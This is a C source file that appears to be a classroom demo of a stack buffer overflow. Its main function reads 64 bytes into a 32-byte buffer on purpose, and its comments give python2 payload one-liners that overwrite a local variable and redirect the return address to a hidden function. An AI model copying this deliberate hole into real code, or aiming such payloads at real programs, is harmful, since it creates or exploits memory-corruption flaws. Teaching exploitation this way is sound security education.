#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void secret(int a) {
    printf("Gotcha\n");

    if (a == 0x12345678) {
        printf("Super secret\n");
    }
}

void bye() {
    exit(0);
}

/*
 * overwrite a:
 * (0x2c - 0x08) random characters (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)
 * efcdab00 (a's value in little endian format)
 * python2 -c 'print "A" * (0x2c - 0x8) + "\xef\xcd\xab\x00"' | ./demo
 */

/*
 * overwrite a + call secret:
 * (0x2c - 0x08) random characters (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)
 * efcdab00 (a's value in little endian format)
 * [ebp - 0x4, ebp + 0x4) = 8 bytes of random characters
 * return address (with objdump or nm => 08049216)
 * python2 -c 'print "A" * (0x2c - 0x8) + "\xef\xcd\xab\x00" + "B" * 8 + "\x43\x43\x43\x43"' | ./demo
 * python2 -c 'print "A" * (0x2c - 0x8) + "\xef\xcd\xab\x00" + "B" * 8 + "\x16\x92\x04\x08"' | ./demo
 */

/*
 * dmesg | tail -n 2
 */

int main(void)
{
	// [ebp - 0x8, ebp - 0x4)
	unsigned int a = 1;
	// ebp - 0x2c
	char buffer[32];
	size_t i, len;

	printf("insert buffer string:\n");
	fgets(buffer, 64, stdin);

	printf("buffer is:\n");
	len = strlen(buffer);
	for (i = 0; i < len; i++)
		printf(" %02hhx(%c)", buffer[i], buffer[i]);
	puts("");

	if (a == 0x00abcdef)
		printf("Full of win!\n");
	else
		printf("Not quite there. Try again!\n");
	
	return 0;
}
